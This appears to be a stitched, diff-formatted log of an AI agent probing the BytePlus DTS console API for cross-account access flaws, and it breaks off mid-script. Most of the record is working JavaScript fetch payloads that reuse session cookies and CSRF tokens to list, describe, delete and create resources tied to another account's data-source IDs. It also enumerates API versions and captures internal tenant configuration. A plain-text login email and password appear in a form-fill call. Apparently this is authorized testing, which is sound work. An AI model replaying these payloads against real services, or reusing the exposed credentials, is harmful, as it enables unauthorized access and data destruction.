+4175:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const r=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return await r.text();\n}","waitForStableDom":false}
+4176:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const d=await fetch('/api/top/dts/DeleteDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:'2115010358560165896'})});\n  const dt=await d.text();\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return {delete:dt,list:await l.text()};\n}","waitForStableDom":false}
+4248:-rw-r--r--  1 runner runner  196 Oct 30 09:30 test-account.txt
+4276:[0m$ [0mecho "=== targets.txt ==="; cat data/targets.txt; echo; echo "=== creds/test-account.txt ==="; cat creds/test-account.txt; echo; echo "=== creds/README.md ==="; cat creds/README.md; echo; echo "=== tools/cmd.txt ==="; cat tools/cmd.txt; echo; echo "=== opencode.json ==="; cat opencode.json; echo; echo "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt
+4293:=== creds/test-account.txt ===
+4298:test account a
+4305:test account b
+4316:- `test-account.txt` — public test login for authorized targets.
+4318:Test-account emails, passwords, cookies, and tokens may appear in `result/`
+4378:- Test accounts from `creds/test-account.txt` may be used for authorized login
+4539:{"capturedAt":"2026-10-30T09:17:36.196Z","url":"/api/top/dts/ListMgrCustomerParam/2018-01-01/ap-southeast-1","accountA":"3000823185","authenticated":{"status":200,"headers":{"access-control-allow-credentials":"true","access-control-allow-origin":"https://console.byteplus.com","access-control-expose-headers":"X-XSRF-TOKEN","alt-svc":"h3=\":443\"; ma=93600","cache-control":"max-age=0, no-cache, no-store","content-encoding":"gzip","content-length":"749","content-type":"application/json; charset=utf-8","date":"Fri, 30 Oct 2026 09:17:36 GMT","expires":"Fri, 30 Oct 2026 09:17:36 GMT","pragma":"no-cache","quic-version":"0x00000001","server":"TLB","server-timing":"cdn-cache; desc=MISS, edge; dur=237, origin; dur=199, inner; dur=183,inner; dur=179,inner; dur=117","upstream-caught":"1793351856475127","vary":"Accept-Encoding","x-akamai-request-id":"1b53ebcf.45182bc5","x-cache":"TCP_MISS from a2-17-114-140.deploy.akamaitechnologies.com (AkamaiGHost/22.7.0-e687e9264c02f058b1bf8e920219e21f) (-)","x-cache-remote":"TCP_MISS from a23-52-40-172.deploy.akamaitechnologies.com (AkamaiGHost/22.7.0-e687e9264c02f058b1bf8e920219e21f) (-)","x-need-token":"099631cbca7c610fcbd9cdafa75811f0","x-origin-response-time":"199,23.52.40.172","x-parent-response-time":"430,2.17.114.140","x-tt-logid":"20261030091735D5619528319247353F96","x-tt-trace-host":"01faab45bfb804624c9328f7a264b6bcf5a896e4be9fa94dac4b6813099b302aa48e4089e0924f8e38761b76ec2cbe7517970273de91a4f1fdbb962644414272aa87d04cecde0519095f58da6d22d571642fc78da3d33d02f903dd2c37d8de894b","x-tt-trace-id":"00-261030091735D5619528319247353F96-5484095D8C672A0E-00","x-tt-trace-tag":"id=16;cdn-cache=miss;type=dyn"},"body":"{\"ResponseMetadata\":{\"RequestId\":\"20261030091735D5619528319247353F96-6d04cd\",\"Action\":\"ListMgrCustomerParam\",\"Version\":\"2018-01-01\",\"Service\":\"dts\",\"Region\":\"ap-southeast-1\"},\"Result\":{\"Params\":[{\"DefaultValue\":\"\",\"Desc\":\"Mongo 数据订阅租户开关,*表示全部开启\",\"Name\":\"EnableMongoSubTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"*\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"SQL Server 迁移租户开关，*表示全部开启\",\"Name\":\"EnableMSSQLTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"*\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"RDS Sharding 迁移租户开关，* 表示全部开启\",\"Name\":\"EnableRDSShardingTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"1600000106\\\",\\\"3000006772\\\",\\\"1600000101\\\",\\\"3000001999\\\",\\\"2100222151\\\",\\\"2100584669\\\",\\\"2100222152\\\",\\\"1600000105\\\",\\\"2100365179\\\",\\\"2100365181\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"启用ByteES租户开关，*代表全开\",\"Name\":\"EnableByteESTenantIDList\",\"Source\":\"\",\"Value\":\"[\\\"1600000101\\\"]\"},{\"DefaultValue\":\"[\\\"*\\\"]\",\"Desc\":\"订阅任务可以使用自定义bytedancemq的租户，*代表所有\",\"Name\":\"EnableUsingCustomByteDanceMQTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"*\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"订阅任务可以使用自定义内部bmq的租户，*代表所有\",\"Name\":\"EnableUsingCustomInnerByteDanceMQTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"2100365179\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"订阅任务可以使用自定义内场rmq的租户，*代表所有\",\"Name\":\"EnableUsingCustomByteDanceRMQTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"2100365179\\\",\\\"3000619337\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"MySQL Sharding 订阅租户开关, *表示全部开启\",\"Name\":\"EnableSubscriptionVolcShardingWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"1600000101\\\",\\\"2000006376\\\",\\\"2100157781\\\",\\\"2100222151\\\",\\\"2100584669\\\",\\\"2100222152\\\",\\\"2100365179\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"RDS Sharding 同步租户开关，* 表示全部开启\",\"Name\":\"EnableSyncRDSShardingTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"1600000106\\\",\\\"3000006772\\\",\\\"1600000101\\\",\\\"2100222151\\\",\\\"2100584669\\\",\\\"3000006772\\\",\\\"2100222152\\\",\\\"2110030910\\\",\\\"2110030915\\\",\\\"2106096785\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"使用火山企业版redis租户开关，*表示全部开启\",\"Name\":\"EnableVolcEnterpriseRedisWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"2100365189\\\",\\\"3000738311\\\",\\\"3000968188\\\"]\"}]}}"},"csrfOnlyNoSession":{"status":200,"headers":{"access-control-allow-credentials":"true","access-control-allow-origin":"https://console.byteplus.com","access-control-expose-headers":"X-XSRF-TOKEN","alt-svc":"h3=\":443\"; ma=93600","cache-control":"max-age=0, no-cache, no-store","content-encoding":"gzip","content-length":"204","content-type":"application/json; charset=utf-8","date":"Fri, 30 Oct 2026 09:17:37 GMT","expires":"Fri, 30 Oct 2026 09:17:37 GMT","pragma":"no-cache","quic-version":"0x00000001","server":"TLB","server-timing":"cdn-cache; desc=MISS, edge; dur=477, origin; dur=25, inner; dur=5,inner; dur=1","upstream-caught":"1793351857191512","vary":"Accept-Encoding","x-akamai-request-id":"4d0850dd.13b18d7.281240c","x-cache":"TCP_MISS from a23-218-223-74.deploy.akamaitechnologies.com (AkamaiGHost/22.7.0-e687e9264c02f058b1bf8e920219e21f) (-)","x-cache-remote":"TCP_MISS from a23-49-99-198.deploy.akamaitechnologies.com (AkamaiGHost/22.7.0-e687e9264c02f058b1bf8e920219e21f) (-)","x-need-token":"8b13c7ddf17a645320fff792b453c01c","x-origin-response-time":"25,23.52.40.175","x-parent-response-time":"93,23.49.99.198, 499,23.218.223.74","x-tt-logid":"202610300917365EBDBDB569D93A47AFC1","x-tt-trace-host":"01b48de4bc688afa82fbf7ec37e2cce851a652dce4e4f770722aa1cf0f1c56846b5ada38929d1de6d77d6077ee63a012de07ceb836e2d6e7d9c036edb63f75451f6f73cbf4b33fa1bdbbf54b5405221c234b0a55756bb2dc2d1f3e238de8b64aae6913c0de79038d89a6b061d855f447635568bc6203c90dc06e249734e1bc38a4","x-tt-trace-id":"00-2610300917365EBDBDB569D93A47AFC1-4CFA333C3135A2D3-00","x-tt-trace-tag":"id=16;cdn-cache=miss;type=dyn"},"body":"{\"ResponseMetadata\":{\"RequestId\":\"202610300917365EBDBDB569D93A47AFC1\",\"Action\":\"ListMgrCustomerParam\",\"Version\":\"2018-01-01\",\"Service\":\"dts\",\"Region\":\"ap-southeast-1\",\"Error\":{\"Code\":\"InvalidCSRFToken\",\"Message\":\"Invalid CSRF token.\"}}}"},"noCsrfNoSession":{"status":200,"body":"{\"ResponseMetadata\":{\"RequestId\":\"2026103009173603D4D28BEF6A18B44CF4\",\"Action\":\"ListMgrCustomerParam\",\"Version\":\"2018-01-01\",\"Service\":\"dts\",\"Region\":\"ap-southeast-1\",\"Error\":{\"Code\":\"InvalidCSRFToken\",\"Message\":\"Invalid CSRF token.\"}}}"}}
+4551:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const ids=['2116046640132395013','2115010358560165895'];\n  const out={account:document.cookie.match(/AccountID=([^;]+)/)?.[1]||null};\n  for(const id of ids){\n    const r=await fetch('/api/top/dts/DescribeDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:id})});\n    out[id]=await r.text();\n  }\n  return out;\n}","filePath":"/tmp/b_ds.json","waitForStableDom":false}
+4556:print('account',d['account'])
+4558:    if k=='account': continue
+4562:account 3001021825
+4564:{"ResponseMetadata":{"RequestId":"20261030091859F9330A1E2094837B3F06-c6c298","Action":"DescribeDataSource","Version":"2022-10-01","Service":"dts","Region":"ap-southeast-1"},"Result":{"DataSource":{"Category":"MySQL","CreateTime":1793350809819,"DataSourceId":"2116046640132395013","EndpointType":"Public_MySQL","ModifyTime":1793351406208,"Name":"aaitest-ds-b-renamed","PublicMySQLSettings":{"Host":"192.0.2.1","Password":"aaitestpass","Port":3306,"RegionSettings":{"Region":"ap-southeast-1"},"Username":"aaitest"}}}}
+4566:{"ResponseMetadata":{"RequestId":"202610300918597AA73CD2A16A112813B0-4e9537","Action":"DescribeDataSource","Version":"2022-10-01","Service":"dts","Region":"ap-southeast-1"},"Result":{"DataSource":{"Category":"MySQL","CreateTime":1793350890190,"DataSourceId":"2115010358560165895","EndpointType":"Public_MySQL","Name":"aaitest-ma-b-20261030","PublicMySQLSettings":{"Host":"192.0.2.1","Password":"aaitestpass","Port":3306,"RegionSettings":{"Region":"ap-southeast-1"},"Username":"aaitest"}}}}
+4573:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const id='2116046640132395013';\n  const vers=['2018-01-01','2019-01-01','2020-01-01','2020-10-01','2021-01-01','2021-10-01','2022-01-01','2022-10-01','2023-01-01','2023-10-01','2024-01-01'];\n  const out=[];\n  for(const ver of vers){\n    for(const [a,body] of [['DescribeDataSource',{DataSourceId:id}],['ListDataSource',{PageNum:1,PageSize:50,Identifier:id}]]){\n      const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      if(code!=='InvalidActionOrVersion'||t.includes(id)) out.push({a,ver,code,hit:t.includes(id),snip:t.slice(0,220)});\n    }\n  }\n  return out;\n}","waitForStableDom":false}
+4575:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const r=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return await r.text();\n}","waitForStableDom":false}
+4576:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const d=await fetch('/api/top/dts/DeleteDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:'2115010358560165896'})});\n  const dt=await d.text();\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return {delete:dt,list:await l.text()};\n}","waitForStableDom":false}
+4648:-rw-r--r--  1 runner runner  196 Oct 30 09:30 test-account.txt
+4676:[0m$ [0mecho "=== targets.txt ==="; cat data/targets.txt; echo; echo "=== creds/test-account.txt ==="; cat creds/test-account.txt; echo; echo "=== creds/README.md ==="; cat creds/README.md; echo; echo "=== tools/cmd.txt ==="; cat tools/cmd.txt; echo; echo "=== opencode.json ==="; cat opencode.json; echo; echo "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt
+4693:=== creds/test-account.txt ===
+4698:test account a
+4705:test account b
+4716:- `test-account.txt` — public test login for authorized targets.
+4718:Test-account emails, passwords, cookies, and tokens may appear in `result/`
+4778:- Test accounts from `creds/test-account.txt` may be used for authorized login
+[0m
+[0m$ [0mgrep -aoE '"(Code|Message)":"[^"]+"' result/logs/opencode.log | sort | uniq -c | sort -rn | head -40
+5 "Message":"Invalid CSRF token."
+      5 "Code":"InvalidCSRFToken"
+      3 "Message":"Not logged in"
+      3 "Code":"NotLogin"
+      1 "Message":"The specified key does not exist."
+      1 "Code":"NoSuchKey"
+[0m
+[0m← [0mWrite result/logs/session.md
+Wrote file successfully.
+[0m
+[0m⚙ [0mchrome-devtools_navigate_page {"pageId":1,"type":"url","url":"https://console.byteplus.com/dts/region:dts+ap-southeast-1/","timeout":45000}
+[0m⚙ [0mchrome-devtools_take_snapshot {"pageId":1}
+[0m⚙ [0mchrome-devtools_click {"pageId":1,"uid":"1_33"}
+[0m⚙ [0mchrome-devtools_fill_form {"pageId":1,"elements":[{"uid":"1_7","value":"adoringjepsen1@fearlessmails.com"},{"uid":"1_8","value":"Acd3423@#345566"}]}
+[0m⚙ [0mchrome-devtools_click {"pageId":1,"uid":"1_14","includeSnapshot":true}
+[0m⚙ [0mchrome-devtools_wait_for {"pageId":1,"text":["Dashboard","DTS","Verification","captcha","incorrect","Invalid"],"timeout":15000}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"() => { const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)}); return {url:location.href, account:c.AccountID||null, cookieKeys:Object.keys(c), csrf:c.csrfToken? c.csrfToken.slice(0,8)+'...':null}; }","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const call=async(a,body)=>{const r=await fetch(`/api/top/dts/${a}/2022-10-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});return {status:r.status,txt:(await r.text()).slice(0,3000)};};\n  const out={account:c.AccountID};\n  out.list=await call('ListDataSource',{PageNum:1,PageSize:50});\n  out.b1=await call('DescribeDataSource',{DataSourceId:'2116046640132395013'});\n  out.b2=await call('DescribeDataSource',{DataSourceId:'2115010358560165895'});\n  return out;\n}","waitForStableDom":false}
+[0m
+[0m$ [0mgrep -an 'CreateDataSource\|CreateValidationTask\|DeleteDataSource\|CheckDataSourceConnection' result/logs/opencode.log | tail -20
+3753:index.b73cff3d.js 405360 'sumeTransmissionTask="ResumeTransmissionTask",e.ResumeTransmissionTasks="ResumeTransmissionTasks",e.RetryTransmissionTask="RetryTransmissionTask",e.RetryTransmissionTasks="RetryTransmissionTasks",e.DeleteTransmissionTask="DeleteTransmissionTask",e.DeleteTransmissionTasks="DeleteTransmissionTasks",e.CloneTransmissionTask="CloneTransmissionTask",e.DescribeTransmissionTasksByInstanceId="DescribeTransmissionTasksByInstanceId",e.CreateValidationTask="CreateValidationTask",e.DeleteValidationTask="DeleteValidationTask",e.DeleteValidationTasks="DeleteValidationTasks",e.DescribeValidationTaskInfo="DescribeValidationTaskInfo",e.DescribeValidationTaskResult="DescribeValidationTaskResult",e.DescribeValidationTasks="DescribeValidationTasks",e.DownloadValidationTaskResult="DownloadValidationTaskResult",e.ModifyValidationTask="ModifyValidationTask",e.ResumeValidationTask="ResumeValidationTask",e.ResumeValidationTasks="ResumeValidationTasks",e.RetryValidationTask="RetryValidationTask",e.RetryValidationTasks="RetryValidationTasks",e.StartValidationTask="StartValidationTask",e.StartValidationTasks="StartValidationTasks",'
+3755:index.b73cff3d.js 439050 'ngeMongoShardTopo:function(){return g._C},CheckDataSourceConnection:function(){return n.Rc},CheckDataSourceSqlsValid:function(){return n.PL},CheckTaskQuota:function(){return g.u6},CloneTransmissionTask:function(){return g.jQ},CreateDataSource:function(){return n.ld},CreateDataValidationTask:function(){return g.WY},CreatePreOrder:function(){return g.I2},CreateSubscriptionGroup:function(){return g.jC},CreateTransmissionTask:function(){return g.I7},CreateValidationTask:function(){return g.nz},CrossRegionDescribeDB:function(){return n.a_},DeleteDataSource:function(){return n.jl},DeleteDataValidationTask:function(){return g.Ji},DeleteSubscriptionGroup:function(){return g.UM},DeleteTransmissionTask:function(){return g.pW},DeleteTransmissionTasks:function(){return g.Vp},DeleteValidationTask:function(){return g.N},DeleteValidationTasks:function(){return g.pO},DescribeAlertInfos:function(){return i.a5},DescribeAlertRule:function(){return i.F8},DescribeDFlowList:function(){return f},DescribeDataSource:function(){return n.EL},DescribeDataSourceType:function(){return n.Qq},DescribeDataValidationResult:function(){re'
+3757:index.b73cff3d.js 456829 's)},I=(e,t)=>{var a,o,r,s;return(0,i.Qu)(i.L5.postV2(e,c(c({Action:n.aU.CloneTransmissionTask,Service:d,Version:p},u),t)),null!=(o=null==(a=null==t?void 0:t.logOptions)?void 0:a.scene)?o:"dtsService(2022-10-01)\\u8bf7\\u6c42\\u5931\\u8d25",null!=(s=null==(r=null==t?void 0:t.logOptions)?void 0:r.describe)?s:"\\u8bf7\\u6c42CloneTransmissionTask\\u5931\\u8d25",null==t?void 0:t.logOptions)},P=(e,t)=>{var a,o,r,s;return(0,i.Qu)(i.L5.postV2(e,c(c({Action:n.aU.CreateValidationTask,Service:d,Version:p},u),t)),null!=(o=null==(a=null==t?void 0:t.logOptions)?void 0:a.scene)?o:"dtsService(2022-10-01)\\u8bf7\\u6c42\\u5931\\u8d25",null!=(s=null==(r=null==t?void 0:t.logOptions)?void 0:r.describe)?s:"\\u8bf7\\u6c42CreateValidationTask\\u5931\\u8d25",null==t?void 0:t.logOptions)},R=(e,t)=>{var a,o,r,s;return(0,i.Qu)(i.L5.postV2(e,c(c({Action:n.aU.DescribeValidationTaskInfo,Service:d,Version:p},u),t)),null!=(o=null==(a=null==t?void 0:t.logOptions)?void 0:a.scene)?o:"dtsService(2022-10-01)\\u8bf7\\u6c42\\u5931\\u8d25",null!=(s=null==(r=null==t?void 0:t.logOptions)?void 0:r.describe)?s:"\\u8bf7\\u6c42DescribeValidationTaskInfo\\u5931\\u8d25",null'
+3773:index.b73cff3d.js 408546 'aSourceInstanceNodes",e.StartETLDebug="StartETLDebug",e.GenerateETL="GenerateETL",e.OpenMSSQLDBOnline="OpenMSSQLDBOnline",e.OpenMSSQLIncrCDC="OpenMSSQLIncrCDC",e.DescribeMSSQLBackups="DescribeMSSQLBackups",e.DescribeMSSQLRecoverDbs="DescribeMSSQLRecoverDbs",e.ListDataSource="ListDataSource",e.ModifyDataSource="ModifyDataSource",e.CreateDataSource="CreateDataSource",e.DeleteDataSource="DeleteDataSource",e.DescribeDataSource="DescribeDataSource",e.CreateSubscriptionGroup="CreateSubscriptionGroup",e.UpdateSubscriptionGroup="UpdateSubscriptionGroup",e.DeleteSubscriptionGroup="DeleteSubscriptionGroup",e.DescribeSubscriptionGroup="DescribeSubscriptionGroup",e.DescribeSubscriptionGroups="DescribeSubscriptionGroups",e.DescribeSubscriptionGroupProgress="DescribeSubscriptionGroupProgress",e.DescribeInstanceSpecs="DescribeInstanceSpecs",e.DescribeInstancePrice="DescribeInstancePrice",e.DescribeTaskPrice="DescribeTaskPrice",e.DescribePriceDifferences="DescribePriceDifferences",e.CreatePreOrder="CreatePreOrder",e.InnerListTradeInstance="InnerListTradeInstance",e.InnerOpTradeInstance="InnerOpTradeInstance",e.ModifyInsta'
+3775:index.b73cff3d.js 408571 'tartETLDebug="StartETLDebug",e.GenerateETL="GenerateETL",e.OpenMSSQLDBOnline="OpenMSSQLDBOnline",e.OpenMSSQLIncrCDC="OpenMSSQLIncrCDC",e.DescribeMSSQLBackups="DescribeMSSQLBackups",e.DescribeMSSQLRecoverDbs="DescribeMSSQLRecoverDbs",e.ListDataSource="ListDataSource",e.ModifyDataSource="ModifyDataSource",e.CreateDataSource="CreateDataSource",e.DeleteDataSource="DeleteDataSource",e.DescribeDataSource="DescribeDataSource",e.CreateSubscriptionGroup="CreateSubscriptionGroup",e.UpdateSubscriptionGroup="UpdateSubscriptionGroup",e.DeleteSubscriptionGroup="DeleteSubscriptionGroup",e.DescribeSubscriptionGroup="DescribeSubscriptionGroup",e.DescribeSubscriptionGroups="DescribeSubscriptionGroups",e.DescribeSubscriptionGroupProgress="DescribeSubscriptionGroupProgress",e.DescribeInstanceSpecs="DescribeInstanceSpecs",e.DescribeInstancePrice="DescribeInstancePrice",e.DescribeTaskPrice="DescribeTaskPrice",e.DescribePriceDifferences="DescribePriceDifferences",e.CreatePreOrder="CreatePreOrder",e.InnerListTradeInstance="InnerListTradeInstance",e.InnerOpTradeInstance="InnerOpTradeInstance",e.ModifyInstanceOrder="ModifyInstanceO'
+3833:477292 'on",{},"\\u4efb\\u52a1\\u5bf9\\u8c61\\u914d\\u7f6e\\u7f3a\\u5931")};if(o.EnableTargetEdit||!o.isCreate){const[e]=yield(0,f.ModifyValidationTask)({SolutionSettings:r,TaskId:o.TaskID});return e?{}:{TaskID:o.TaskID}}if(!s)return{message:a.oc.t("basic_information_is_missing",{},"\\u57fa\\u672c\\u4fe1\\u606f\\u7f3a\\u5931")};const c=(0,E.vY)(s,n,t.data.scenesParams,t);if(!c)return{message:a.oc.t("basic_information_is_missing",{},"\\u57fa\\u672c\\u4fe1\\u606f\\u7f3a\\u5931")};if(o.TaskID){const[e]=yield(0,f.ModifyValidationTask)(Z(z({},c),{SolutionSettings:r,TaskId:o.TaskID}));return e?{}:{TaskID:o.TaskID}}{const[e,n]=yield(0,f.CreateValidationTask)(Z(z({},c),{SolutionSettings:r,TaskType:s,ParentTaskID:o.BasisTaskID,IdempotencyKey:t.data.idempotencyKey}));return!e&&n?((0,C.set)(t.data,["scenesParams","TaskID"],n.TaskId),{TaskID:null==n?void 0:n.TaskId}):{}}}))}({form:p});const{srcType:S,destType:b}=(0,E.B)(p),y=g.TaskType,v=(0,C.get)(m,["ETLSettings","checkInfo","state"]);if(v===M.j.Fail||v===M.j.WaitToCheck)return{message:a.oc.t("etl_syntax_verification_failed",{},"ETL\\u8bed\\u6cd5\\u6821\\u9a8c\\u672a\\u901a\\u8fc7")};if(g.EnableTargetEdit||g.IsReverse){const e=null!=(t=(0,E.CB)(p.data))?t:{},i=null==(n=e.SrcConfig)?void 0:n.EndpointType;if(!i)return{message:a.oc.t("missing_source_information",{},"\\u6e90\\u5e93\\u4fe1\\u606f\\u7f3a\\u5931")};const l=null==(o=e.DestConfig)?void 0:o.EndpointType;if(!l)return{message:a.oc.t("missing_target_database_information",{},"\\u76ee\\u6807\\u5e93\\u4fe1\\u606f\\u7f3a\\u5931")};const c=e.DestConfig&&(null==(r=null==(s=(0,h.Lp)(e.DestConfig))?void 0:s.value)?void 0:r.Region),u=(0,E.XF)({srcTyp'
+4168:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const body={SrcConfig:src,DestConfig:dst,SolutionSettings:{},TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n  const r=await fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n  const t=await r.text();\n  return {status:r.status,body:body,resp:t};\n}","waitForStableDom":false}
+4169:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const variants=[\n    {SolutionSettings:{MySQL2MySQLSettings:{}}},\n    {SolutionSettings:{SolutionType:'MySQL2MySQL',MySQL2MySQLSettings:{}}},\n    {SolutionSettings:{MySQL2MySQL:{}}},\n  ];\n  const out=[];\n  for(const v of variants){\n    const body={SrcConfig:src,DestConfig:dst,...v,TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n    const r=await fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    out.push({variant:Object.keys(v),resp:await r.text()});\n  }\n  return out;\n}","waitForStableDom":false}
+4170:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const variants=[\n    [{MySQL2MySQLSettings:{ObjectMappings:[]}}],\n    [{MySQL2MySQLSettings:{},ObjectMappings:[]}],\n    [{MySQL2MySQLSettings:{ObjectMappings:[{SrcObjName:'aaitest',DestObjName:'aaitest',ObjectType:'Table'}]}}],\n  ];\n  const out=[];\n  for(const [ss] of variants){\n    const body={SrcConfig:src,DestConfig:dst,SolutionSettings:ss,TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n    const r=await 